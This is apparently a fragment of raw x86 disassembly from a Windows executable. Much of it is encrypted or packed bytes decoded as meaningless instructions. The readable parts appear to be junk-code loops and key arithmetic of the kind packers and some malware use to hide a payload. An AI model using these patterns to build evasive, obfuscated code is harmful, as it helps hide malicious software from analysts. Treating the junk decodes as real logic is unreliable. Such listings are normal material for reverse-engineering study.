  40303a:	add    DWORD PTR [esp+0x24],ebx
  40303e:	shl    DWORD PTR [ebp+0x1e],1
  403041:	jmp    0x40301e
  403043:	sub    ebp,DWORD PTR [ebx-0x3a]
  403046:	pushf  
  403047:	push   eax
  403048:	push   ss
  403049:	cwde   
  40304a:	xor    eax,0x284c8c7e
  40304f:	jmp    0x403001
  403051:	inc    edx
  403052:	mov    edi,0xfa3833b2
  403057:	scas   eax,DWORD PTR es:[edi]
  403058:	or     BYTE PTR [edi+0x75],bh
  40305b:	push   ecx
  40305c:	inc    esi
  40305d:	sbb    BYTE PTR gs:[edx-0x5849c1f4],bl
  403064:	fcom   QWORD PTR [edx]
  403066:	pop    edi
  403067:	addr16 push 0x5d
  40306a:	push   esp
  40306b:	test   BYTE PTR [eax+edi*1-0x16],dh
  40306f:	leave  
  403070:	pushf  
  403071:	daa    
  403072:	(bad)  
  403073:	xor    eax,0x8846af1e
  403078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403079:	xchg   ebx,eax
  40307a:	xor    BYTE PTR [ecx],dl
  40307c:	push   edi
  40307d:	fwait
  40307e:	cmc    
  40307f:	fisubr DWORD PTR [eax]
  403081:	push   esp
  403082:	out    0x5,al
  403084:	test   edx,ebx
  403086:	mov    edi,0x59f00328
  40308b:	js     0x403096
  40308d:	repnz aaa 
  40308f:	xchg   esi,eax
  403090:	mov    al,0x37
  403092:	out    dx,eax
  403093:	xorps  xmm6,xmm2
  403096:	cwde   
  403097:	out    0xde,al
  403099:	ins    DWORD PTR es:[edi],dx
  40309a:	loopne 0x403094
  40309c:	mov    edx,0x4f005883
  4030a1:	fwait
  4030a2:	pop    ebx
  4030a3:	pop    ecx
  4030a4:	sub    al,0x77
  4030a6:	xchg   ebp,eax
  4030a7:	lock test al,0xde
  4030aa:	fucomp st(4)
  4030ac:	jo     0x4030ca
  4030ae:	mov    ah,BYTE PTR [ebp+0x7d55f61e]
  4030b4:	cmp    BYTE PTR ds:0xc1e4f250,0xa4
  4030bb:	es jbe 0x40306e
  4030be:	push   ss
  4030bf:	(bad)  
  4030c1:	jmp    FWORD PTR [ecx+0x68fb72ca]
  4030c7:	jmp    0xf37:0x11a9e688
  4030ce:	ins    DWORD PTR es:[edi],dx
  4030cf:	out    0x96,al
  4030d1:	xchg   esi,eax
  4030d2:	sbb    DWORD PTR [edi+ebx*8+0x44c261be],esi
  4030d9:	and    DWORD PTR [eax-0x6df371b4],eax
  4030df:	sub    dl,BYTE PTR [eax-0x10eabf03]
  4030e5:	mov    ebp,0xfaf09a3f
  4030ea:	jno    0x403136
  4030ec:	push   ds
  4030ed:	adc    eax,0x4737db8a
  4030f2:	dec    ebx
  4030f3:	je     0x40309a
  4030f5:	pop    esp
  4030f6:	jmp    0x4030e8
  4030f8:	inc    ebx
  4030f9:	xor    esp,esp
  4030fb:	loopne 0x4030a7
  4030fd:	ss push ds
  4030ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403100:	xchg   ecx,eax
  403101:	sub    cl,BYTE PTR [ebx+edx*2-0x49]
  403105:	xchg   edx,eax
  403106:	pop    ecx
  403107:	or     eax,0x5f60bf0
  40310c:	ins    BYTE PTR es:[edi],dx
  40310d:	leave  
  40310e:	sahf   
  40310f:	or     edi,esp
  403111:	mov    ds:0x682770f8,eax
  403116:	call   0x37f96900
  40311b:	or     DWORD PTR [ebp-0x206585d],0x85e5eee7
  403125:	pop    ebx
  403126:	lahf   
  403127:	mov    cl,0x29
  403129:	adc    al,0x4e
  40312b:	inc    ebx
  40312c:	enter  0x54ab,0x44
  403130:	push   es
  403131:	imul   edi,DWORD PTR [ecx],0x5d
  403134:	jp     0x40319c
  403136:	lea    ebp,ds:[eax-0x80]
  40313a:	xchg   ebp,eax
  40313b:	(bad)  
  40313d:	push   eax
  40313e:	dec    BYTE PTR [ebx+0xd8bc845]
  403144:	mov    al,0x3b
  403146:	inc    ecx
  403147:	add    BYTE PTR [ecx],al
  403149:	or     BYTE PTR [edi-0x17],bl
  40314c:	pushf  
  40314d:	add    DWORD PTR [eax],eax
  40314f:	add    BYTE PTR [edx],al
  403151:	adc    DWORD PTR [eax+0x21b389ab],ecx
  403157:	mov    cl,0x82
  403159:	xchg   edx,eax
  40315a:	pop    esp
  40315b:	shl    DWORD PTR [ebx],0xe2
  40315e:	es jo  0x40311b
  403161:	pop    ss
  403162:	jle    0x4031e2
  403164:	cli    
  403165:	jg     0x4031e5
  403167:	jle    0x403140
  403169:	out    dx,al
  40316a:	push   ebp
  40316b:	xchg   edx,eax
  40316c:	jecxz  0x4030f5
  40316e:	sti    
  40316f:	cmc    
  403170:	ins    DWORD PTR es:[edi],dx
  403171:	retf   
  403172:	or     dl,ah
  403174:	mov    fs,esp
  403176:	push   cs
  403177:	adc    cl,BYTE PTR [eax]
  403179:	ss inc ebp
  40317b:	gs in  eax,dx
  40317d:	fld    DWORD PTR [edx-0x4]
  403180:	mov    eax,0x2cad0432
  403185:	sub    DWORD PTR [eax-0x34c23060],eax
  40318b:	sbb    DWORD PTR [ebx+ebp*8-0x449e29],0xffffffd9
  403193:	or     al,BYTE PTR [edi+edi*8]
  403196:	jmp    0x403138
  403198:	xchg   edx,eax
  403199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40319a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40319b:	pmaxub mm1,QWORD PTR [edx]
  40319e:	int    0x6f
  4031a0:	pop    eax
  4031a1:	retf   
  4031a2:	sqrtps xmm2,XMMWORD PTR [ebx-0x3d5a606e]
  4031a9:	xor    DWORD PTR [esi+0x6c9d356c],edi
  4031af:	arpl   WORD PTR [eax-0x66],si
  4031b2:	jbe    0x4031a9
  4031b4:	push   esi
  4031b5:	inc    ebx
  4031b6:	pop    edi
  4031b7:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4031b9:	(bad)  
  4031bb:	loope  0x403193
  4031bd:	push   es
  4031be:	imul   esi,DWORD PTR [ebp-0x3f],0x3a
  4031c2:	test   esi,edx
  4031c4:	daa    
  4031c5:	jle    0x403194
  4031c7:	push   esi
  4031c8:	and    BYTE PTR [ecx],ch
  4031ca:	lods   al,BYTE PTR ds:[esi]
  4031cb:	lods   al,BYTE PTR ds:[esi]
  4031cc:	nop
  4031cd:	add    al,0xe5
  4031cf:	or     al,0xd4
  4031d1:	pop    ecx
  4031d2:	pop    ss
  4031d3:	dec    esp
  4031d4:	jnp    0x403159
  4031d6:	mov    ch,0xc0
  4031d8:	repnz cmp al,0x9f
  4031db:	ja     0x403219
  4031dd:	jmp    0xc5f8:0xc1a6cffb
  4031e4:	rol    bh,0x2d
  4031e7:	shl    ah,cl
  4031e9:	test   DWORD PTR [esi],esp
  4031eb:	aad    0x8d
  4031ed:	jns    0x4031b4
  4031ef:	iret   
  4031f0:	in     al,0xee
  4031f2:	iret   
  4031f3:	inc    esi
  4031f4:	jne    0x403226
  4031f6:	pop    ds
  4031f7:	xor    al,0xa9
  4031f9:	test   al,0x68
  4031fb:	mov    bh,0xda
  4031fd:	jle    0x40322d
  4031ff:	xor    DWORD PTR [ebx-0x56867cc],edx
  403205:	dec    edx
  403206:	jo     0x403249
  403208:	out    0x94,eax
  40320a:	pop    esp
  40320b:	das    
  40320c:	inc    ebx
  40320d:	fmul   st,st(5)
  40320f:	(bad)  
  403210:	addr16 aad 0xbd
  403213:	xlat   BYTE PTR ds:[ebx]
  403214:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403215:	jo     0x4031c8
  403217:	in     al,0x9
  403219:	out    dx,al
  40321a:	cmp    DWORD PTR ds:0xbde124f4,eax
  403220:	add    dl,dl
  403222:	inc    ebx
  403223:	jae    0x403220
  403225:	pop    ebx
  403226:	popf   
  403227:	xor    dh,BYTE PTR [esi-0x79f595bd]
  40322d:	sub    eax,0xf0bd9bc2
  403232:	push   ss
  403233:	xor    ch,cl
  403235:	mov    cl,0xcc
  403237:	outs   dx,BYTE PTR ds:[esi]
  403238:	cmp    edi,DWORD PTR [esi-0x7d]
  40323b:	and    BYTE PTR [edx-0x77c11cc0],ah
  403241:	div    DWORD PTR [edi-0x7ba19c99]
  403247:	fwait
  403248:	and    al,0x52
  40324a:	repz push ebx
  40324c:	add    DWORD PTR [eax+ebx*8+0x3b],edx
  403250:	mov    ch,0xec
  403252:	cdq    
  403253:	push   0xffffffbe
  403255:	cs and al,0x9d
  403258:	scas   eax,DWORD PTR es:[edi]
  403259:	ins    BYTE PTR es:[edi],dx
  40325a:	jl     0x40321f
  40325c:	pop    edi
  40325d:	int    0x72
  40325f:	retf   
  403260:	or     BYTE PTR [ebx-0x58],ch
  403263:	jb     0x4032d7
  403265:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403266:	jl     0x403235
  403268:	xor    DWORD PTR [ecx-0x12],esi
  40326b:	push   ebx
  40326c:	popa   
  40326d:	push   eax
  40326e:	gs iret 
  403270:	fiadd  WORD PTR ss:[esi+0x55faddc7]
  403277:	das    
  403278:	aaa    
  403279:	jno    0x4032f9
  40327b:	clc    
  40327c:	push   ebp
  40327d:	pop    edx
  40327e:	js     0x403234
  403280:	adc    dl,BYTE PTR [esi+esi*1-0x3]
  403284:	pop    ds
  403285:	inc    ebp
  403286:	adc    al,0xc1
  403288:	shr    DWORD PTR [ebx+0x5627b0c1],0x7f
  40328f:	call   0xa392:0xb7cdd063
  403296:	lods   eax,DWORD PTR ds:[esi]
  403297:	das    
  403298:	jecxz  0x4032b5
  40329a:	out    dx,eax
  40329b:	idiv   bh
  40329d:	sub    DWORD PTR [edx],ebp
  40329f:	inc    edx
  4032a0:	xchg   edx,eax
  4032a1:	sub    esi,esi
  4032a3:	cwde   
  4032a4:	xchg   esp,eax
  4032a5:	not    DWORD PTR [ebx]
  4032a7:	mov    esi,ebp
  4032a9:	cdq    
  4032aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032ab:	(bad)  
  4032ac:	dec    ecx
  4032ad:	mov    es,WORD PTR fs:[eax+0x1f]
  4032b1:	jmp    0x2a77:0x7b634ffb
  4032b8:	repz xor DWORD PTR [esi],edi
  4032bb:	sahf   
  4032bc:	jb     0x4032e1
  4032be:	adc    al,0x4a
  4032c0:	jae    0x403296
  4032c2:	mov    edx,0xba07006
  4032c7:	call   0xdf9a824e
  4032cc:	imul   esi,DWORD PTR [edx+edi*1+0x35f0c223],0xa31e5814
  4032d7:	pop    edx
  4032d8:	sahf   
  4032d9:	dec    edi
  4032da:	and    al,0x4f
  4032dc:	and    BYTE PTR [eax+0x4b],al
  4032df:	loop   0x40329c
  4032e1:	cs and al,0x92
  4032e4:	adc    al,0xc5
  4032e6:	mov    ds:0xdb5c9ee2,eax
  4032eb:	xchg   ebx,eax
  4032ec:	pop    esi
  4032ed:	pop    ebx
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x4337db,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x4337db
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x4337db,ecx
  40331d:	cmp    DWORD PTR ds:0x4337db,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x4337db,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x43386f,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x433857,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43379f
  40336b:	add    DWORD PTR ds:0x433783,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x4337d7,0x1e
  40338b:	cmp    DWORD PTR ds:0x4337d7,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x4337d7,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x4337d7,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x4337d7
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x4337d7,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x4337d7
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x4337d7,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x433867
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x4337c7
  4033f2:	mov    edi,DWORD PTR ds:0x433807
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x4337e7,0x1c
  40340f:	cmp    DWORD PTR ds:0x4337e7,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x4337e7,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x4337e7,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x4337e7
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x4337e7,edi
  40344c:	mov    edi,DWORD PTR ds:0x4337e7
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x4337e7,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x433863
  403467:	and    edx,DWORD PTR ds:0x433897
  40346d:	mov    DWORD PTR ds:0x433863,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43381b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43389f
  40349f:	adc    DWORD PTR ds:0x43377f,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433897,0x10
  4034c6:	cmp    DWORD PTR ds:0x433897,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433897,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433897,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433897
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433897,edi
  403505:	mov    edi,DWORD PTR ds:0x433897
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433897,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x4338ab,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp+0x5635d48a]
  403537:	jecxz  0x4034f0
  403539:	(bad)  
  40353a:	adc    eax,0x7c587e7e
  40353f:	jle    0x4035bf
  403541:	sbb    al,0xb6
  403543:	fs mov bl,0xab
  403546:	lock mov dh,0x8e
  403549:	out    dx,al
  40354a:	sub    eax,0x50893b4a
  40354f:	nop
  403550:	mov    ebp,0x457fe126
  403555:	retf   
  403556:	loopne 0x40352a
  403558:	mov    cl,0xed
  40355a:	xchg   BYTE PTR ss:[eax],dl
  40355d:	mov    ah,0x7d
  40355f:	sub    al,0xe7
  403561:	fild   WORD PTR [ebx+0x754292ba]
  403567:	inc    eax
  403568:	xchg   esi,eax
  403569:	popa   
  40356a:	cmp    ebp,edx
  40356c:	pop    edi
  40356d:	dec    esp
  40356e:	mov    dl,0x7
  403570:	fdivr  st(6),st
  403572:	rol    DWORD PTR [ebx-0x57d26b02],1
  403578:	dec    esp
  403579:	pusha  
  40357a:	js     0x40356a
  40357c:	jecxz  0x403560
  40357e:	jp     0x403550
  403580:	cwde   
  403581:	lods   ax,WORD PTR ds:[esi]
  403583:	sbb    eax,0xdf215ee1
  403588:	out    0x5a,eax
  40358a:	pop    edi
  40358b:	xor    al,0xbb
  40358d:	lods   al,BYTE PTR ds:[esi]
  40358e:	test   BYTE PTR [edi+ebx*2],bh
  403591:	cmp    eax,0xd6544aae
  403596:	inc    ebp
  403597:	out    dx,eax
  403598:	jb     0x403610
  40359a:	pop    es
  40359b:	jno    0x403558
  40359d:	jmp    0x4035c3
  40359f:	mov    bl,BYTE PTR [ecx]
  4035a1:	jb     0x403564
  4035a3:	lds    esi,FWORD PTR [edi-0x42d03d4]
  4035a9:	pop    esp
  4035aa:	mov    WORD PTR [ecx+0x1a],ss
  4035ad:	jo     0x4035d7
  4035af:	jmp    0x403562
  4035b1:	cmp    esi,ecx
  4035b3:	xor    esp,DWORD PTR gs:[esi-0x4e7fa122]
  4035ba:	and    BYTE PTR [esi],cl
  4035bc:	daa    
  4035bd:	xchg   ebx,eax
  4035be:	mov    edi,0x4c17558e
  4035c3:	imul   esi,DWORD PTR [esp+edx*1],0xffffff84
  4035c7:	fmul   QWORD PTR [ebx+0x3556bfb6]
  4035cd:	out    dx,al
  4035ce:	pop    eax
  4035cf:	idiv   BYTE PTR [ebp+0x419ce600]
  4035d5:	in     eax,0xbd
  4035d7:	cdq    
  4035d8:	aaa    
  4035d9:	cdq    
  4035da:	mov    dh,0x94
  4035dc:	and    BYTE PTR [ebx+0x53c63a76],dh
  4035e2:	out    dx,al
  4035e3:	add    ch,BYTE PTR [ebx-0x3a]
  4035e6:	out    dx,al
  4035e7:	scas   al,BYTE PTR es:[edi]
  4035e8:	ins    BYTE PTR es:[edi],dx
  4035e9:	inc    ebp
  4035ea:	dec    ebx
  4035eb:	stos   DWORD PTR es:[edi],eax
  4035ec:	pusha  
  4035ed:	rcr    dh,cl
  4035ef:	out    0xd8,eax
  4035f1:	xor    DWORD PTR [esi-0x16f360f4],0xffffff86
  4035f8:	paddusb mm1,QWORD PTR [ebx+0x2abae933]
  4035ff:	pusha  
  403600:	(bad)  
  403601:	in     al,dx
  403602:	imul   esp,DWORD PTR [ebp+edi*8-0x45],0x14
  403607:	xor    BYTE PTR [edx],al
  403609:	mov    eax,ds:0x6f1cddef
  40360e:	(bad)  
  40360f:	lods   al,BYTE PTR ds:[esi]
  403610:	add    bh,BYTE PTR [ebp+0x53]
  403613:	lods   eax,DWORD PTR ds:[esi]
  403614:	xor    al,bl
  403616:	lods   al,BYTE PTR ds:[esi]
  403617:	mov    esp,0x3dc28a1c
  40361c:	cmp    eax,0x4af53818
  403621:	mov    cl,0xac
  403623:	jb     0x403623
  403625:	cs in  al,dx
  403627:	mov    ebp,0x87fe96a6
  40362c:	shr    DWORD PTR [ecx+edi*4-0x32992901],0xdc
  403634:	leave  
  403635:	retf   0xf6eb
  403638:	pop    esi
  403639:	xchg   BYTE PTR [esi+0x50],dh
  40363c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40363d:	ins    BYTE PTR es:[edi],dx
  40363e:	cmp    dl,dl
  403640:	dec    edx
  403641:	cmc    
  403642:	inc    ebx
  403643:	jg     0x2ab19d08
  403649:	ja     0x4035e3
  40364b:	cmc    
  40364c:	jge    0x4036c4
  40364e:	in     eax,0xb9
  403650:	aad    0x68
  403652:	push   0x47
  403654:	out    0xe5,eax
  403656:	sub    eax,0x34ae0df0
  40365b:	fisub  DWORD PTR [eax-0x268655f0]
  403661:	fcmovnbe st,st(3)
  403663:	add    edx,DWORD PTR [eax-0x506800e3]
  403669:	lods   al,BYTE PTR ds:[esi]
  40366a:	sub    esp,DWORD PTR [ecx+edi*4]
  40366d:	and    eax,edi
  40366f:	sub    al,0x77
  403671:	cmp    DWORD PTR [edi],edi
  403673:	and    eax,DWORD PTR [ecx-0x5bbf7d47]
  403679:	pop    eax
  40367a:	stos   DWORD PTR es:[edi],eax
  40367b:	inc    eax
  40367c:	and    dh,BYTE PTR [ebp-0x39c2853a]
  403682:	pop    ds
  403683:	(bad)  
  403684:	std    
  403685:	icebp  
  403686:	mov    dl,0x6d
  403688:	retf   0x5296
  40368b:	iret   
  40368c:	(bad)  
  40368d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40368e:	inc    ebp
  40368f:	dec    BYTE PTR [esi+0x259bf232]
  403695:	mov    eax,ds:0x4908a231
  40369a:	xchg   ebp,eax
  40369b:	mov    esp,0xea938587
  4036a0:	mov    ecx,0xa08d60fe
  4036a5:	mov    edx,0x28cc4a06
  4036aa:	retf   0x18ec
  4036ad:	cmp    eax,0x11436ef3
  4036b2:	sti    
  4036b3:	(bad)  
  4036b6:	sub    BYTE PTR [ebx+ebx*8+0x7b],ah
  4036ba:	arpl   cx,ax
  4036bc:	dec    edi
  4036bd:	mov    eax,ds:0x487bfeef
  4036c2:	xor    ah,ah
  4036c4:	call   0x21b3:0x4f19b42f
  4036cb:	xchg   esp,eax
  4036cc:	ss dec ecx
  4036ce:	dec    ebp
  4036cf:	push   0xffffff99
  4036d1:	jmp    0xfcf2:0xef825a3a
  4036d8:	out    dx,eax
  4036d9:	pop    esi
  4036da:	inc    ebx
  4036db:	adc    ebp,edx
  4036dd:	add    ch,bh
  4036df:	inc    ebx
  4036e0:	outs   dx,BYTE PTR ds:[esi]
  4036e1:	enter  0x431a,0x63
  4036e5:	push   esp
  4036e6:	xor    cl,BYTE PTR [ecx]
  4036e8:	xor    ecx,DWORD PTR [edx+0x13]
  4036eb:	out    0x8b,eax
  4036ed:	frstor [ebx-0x40fb1be5]
  4036f3:	add    al,0xbd
  4036f5:	xchg   ecx,eax
  4036f6:	int    0xd7
  4036f8:	and    DWORD PTR [eax],ecx
  4036fa:	test   eax,0x8c3a4ed5
  4036ff:	jl     0x403720
  403701:	cmp    ecx,DWORD PTR [eax+eax*2]
  403704:	clc    
  403705:	pop    edx
  403706:	pop    eax
  403707:	jl     0x4036a5
  403709:	mov    eax,ds:0xb8fa29d2
  40370e:	mov    bl,0xba
  403710:	imul   eax,ebp,0xb45b713e
  403716:	mov    cl,0xeb
  403718:	jmp    0x40371c
  40371a:	cmc    
  40371b:	inc    ebx
  40371c:	es out dx,al
  40371e:	pop    edi
  40371f:	ds fcmovnbe st,st(6)
  403722:	mov    ds,WORD PTR es:[ebp-0x3d32dad7]
  403729:	inc    eax
  40372b:	pusha  
  40372c:	mov    eax,ds:0xd5a69ef
  403731:	sbb    cl,BYTE PTR [ebx]
  403733:	test   al,0xf8
  403735:	fldln2 
  403737:	dec    ebp
  403738:	push   ds
  403739:	cmp    eax,0xab5c51e3
  40373e:	xchg   ebx,eax
  40373f:	cli    
  403740:	ret    0x8d03
  403743:	push   0xffffffe3
  403745:	cli    
  403746:	and    DWORD PTR [esi-0x6c],esp
  403749:	pusha  
  40374a:	or     eax,0xf84c8976
  40374f:	pushf  
  403750:	(bad)  
  403751:	add    BYTE PTR [edx+0x547b4de5],0x82
  403758:	sub    DWORD PTR [ebx+0x42],ecx
  40375b:	mov    al,ds:0x993b16e3
  403760:	lahf   
  403761:	xchg   esi,eax
  403762:	mov    edi,0xca68e8d9
  403767:	push   es
  403768:	jmp    0xe48e1d69
  40376d:	scas   al,BYTE PTR es:[edi]
  40376e:	adc    BYTE PTR [edx-0x2804803b],bl
  403774:	push   ebp
  403775:	loopne 0x4037f5
  403777:	fwait
  403778:	dec    ecx
  403779:	xchg   al,ah
  40377b:	ret    0x5b41
  40377e:	push   esp
  40377f:	adc    eax,esi
  403781:	(bad)  
  403782:	and    ah,BYTE PTR [edi-0x5b]
  403785:	cli    
  403786:	sbb    ebp,edx
  403788:	shl    ebx,cl
  40378a:	mov    BYTE PTR [ebx+0x7de242f2],ah
  403790:	sub    bh,BYTE PTR [edx+0x4dd7631a]
  403796:	sbb    BYTE PTR [edi],al
  403798:	push   ecx
  403799:	xchg   ecx,eax
  40379a:	sbb    al,0xe0
  40379c:	mov    cl,0xaf
  40379e:	ret    0x2f08
  4037a1:	or     BYTE PTR [ecx],ch
  4037a3:	mov    esi,0xbe21f542
  4037a8:	adc    dh,BYTE PTR [ebx+eax*8-0x60]
  4037ac:	add    edx,DWORD PTR [eax-0x6c]
  4037af:	sbb    bh,BYTE PTR [eax+ebp*8-0x6c4eb708]
  4037b6:	lods   al,BYTE PTR ds:[esi]
  4037b7:	clc    
  4037b8:	out    0x2a,eax
  4037ba:	mov    ?,WORD PTR [ebp+0x7e]
  4037bd:	xor    bh,BYTE PTR [eax+0x46fd1e2a]
  4037c3:	lods   eax,DWORD PTR ds:[esi]
  4037c4:	pop    esp
  4037c5:	mov    al,0xe
  4037c7:	test   dl,ch
  4037c9:	sbb    al,0xe1
  4037cb:	fld    QWORD PTR [edi-0x7f9cbd6d]
  4037d1:	cmp    eax,0xe72fa1fc
  4037d6:	jmp    0xad74128d
  4037db:	out    0x82,al
  4037dd:	sub    BYTE PTR [eax],bh
  4037df:	shr    bl,cl
  4037e1:	call   ebx
  4037e3:	dec    ecx
  4037e4:	xor    al,0x7d
  4037e6:	mov    ds:0x6ea46c74,eax
  4037eb:	and    DWORD PTR [eax+esi*1],eax
  4037ee:	ins    BYTE PTR es:[edi],dx
  4037ef:	dec    ebp
  4037f0:	out    dx,al
  4037f1:	add    DWORD PTR [eax+ebp*1],ebp
  4037f4:	mov    al,0x72
  4037f6:	jl     0x403844
  4037f8:	arpl   WORD PTR [edi+0x32],ax
  4037fb:	push   ebx
  4037fc:	or     ebp,DWORD PTR [esi]
  4037fe:	jb     0x4037f9
  403800:	or     al,0x49
  403802:	fild   WORD PTR [ecx]
  403804:	add    DWORD PTR [ebp-0x3e],ecx
  403807:	jae    0x40381c
  403809:	shl    BYTE PTR [ecx+eiz*1],1
  40380c:	cmp    ecx,DWORD PTR [edi+0x7e]
  40380f:	sub    dh,BYTE PTR [ecx+edx*4+0x77f45277]
  403816:	popa   
  403817:	lahf   
  403818:	cdq    
  403819:	lahf   
  40381a:	lds    esp,FWORD PTR [eax+ebp*8]
  40381d:	xor    ah,BYTE PTR ds:0x7150fe5c
  403823:	push   edi
  403824:	rcr    DWORD PTR [ebx-0xd],cl
  403827:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  40382e:	sbb    edi,DWORD PTR ds:0x43377b
  403834:	mov    edx,DWORD PTR [ebp+0x8]
  403837:	sbb    edi,DWORD PTR ds:0x43382b
  40383d:	xor    edx,eax
  40383f:	and    DWORD PTR ds:0x4338a7,0x0
  403849:	xor    edi,edi
  40384b:	add    edi,DWORD PTR ds:0x4338a7
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x4338a7,edi
  403858:	cmp    DWORD PTR ds:0x4338a7,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x4338a7,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x4338a7
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x4338a7,edi
  40389c:	cmp    DWORD PTR ds:0x4338a7,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x4337eb,0x4338ab
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433813,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x43386b,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x4338a7,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x43386b,0x43382b
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x43377b,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433797,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433793,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43389b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x43377f,0x1d
  403935:	cmp    DWORD PTR ds:0x43377f,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x43377f,0x6
